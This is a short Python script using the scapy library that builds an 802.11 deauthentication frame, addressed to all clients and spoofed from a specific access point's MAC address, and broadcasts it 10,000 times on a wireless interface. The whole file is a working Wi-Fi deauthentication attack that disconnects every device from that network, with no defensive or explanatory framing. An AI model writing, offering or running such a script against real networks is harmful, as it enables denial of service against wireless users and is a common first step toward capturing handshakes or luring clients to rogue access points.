from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.all import *



# Manually deauth packet send
pkt = RadioTap() / Dot11(addr1 = "ff:ff:ff:ff:ff:ff", addr2 = "98:1E:19:7B:4D:8E") / Dot11Deauth()
sendp(pkt, iface="wlx000f023a3684", count=10000, inter=.2)